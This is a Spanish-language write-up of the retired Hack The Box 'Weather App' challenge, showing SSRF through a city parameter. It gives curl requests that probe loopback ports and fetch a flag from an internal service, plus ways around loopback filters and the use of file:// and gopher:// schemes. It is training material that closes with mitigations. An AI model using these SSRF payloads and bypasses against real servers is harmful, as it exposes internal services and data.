---
challenge: Weather App
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, ssrf, internal-service, metadata]
---

# Weather App — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

App que consulta el tiempo por ciudad. El backend **hace la petición HTTP por ti** y acepta URLs del usuario: **SSRF**. Apuntando a `127.0.0.1` se llega a un servicio interno que no está expuesto y que devuelve la flag.

## Enunciado

Formulario con un campo de ciudad que devuelve temperatura y condiciones. Hay un servicio interno en el mismo host.

## Análisis

```bash
curl -s "http://<IP>:<puerto>/api/weather?city=Madrid"
```

La respuesta es JSON del proveedor. Se prueba si el parámetro acepta una URL completa:

```bash
curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:80/"
```

Si el cuerpo devuelto cambia al apuntar a otro puerto, la petición la hace el servidor. Enumeración interna:

```bash
for p in 80 3000 5000 8000 8080; do
  echo "== $p"; curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:$p/" | head -c 200; echo
done
```

## Explotación

El servicio interno responde en un puerto local con un endpoint que entrega la flag (o un panel sin autenticación):

```bash
curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:<puerto_interno>/flag"
```

```text
HTB{<flag>}
```

Si el filtro bloquea `127.0.0.1`, las alternativas habituales son `localhost`, `0.0.0.0`, `[::1]` o un dominio que resuelva a loopback.

## Tropiezos

- **Filtro de esquema**: probar `file://` y `gopher://` para leer ficheros o hablar con Redis.
- **Redirecciones**: un 302 hacia el destino interno también sirve si el cliente sigue redirecciones.
- **Puerto equivocado**: enumerar antes de asumir el 80.

## Lecciones

- Una URL controlada por el usuario en el servidor es SSRF, aunque el parámetro se llame «ciudad».
- Loopback y metadatos son el primer destino: los servicios internos no tienen autenticación porque «nadie los ve».
- Mitigación: allowlist de dominios, resolver DNS y bloquear rangos privados, y no seguir redirecciones.
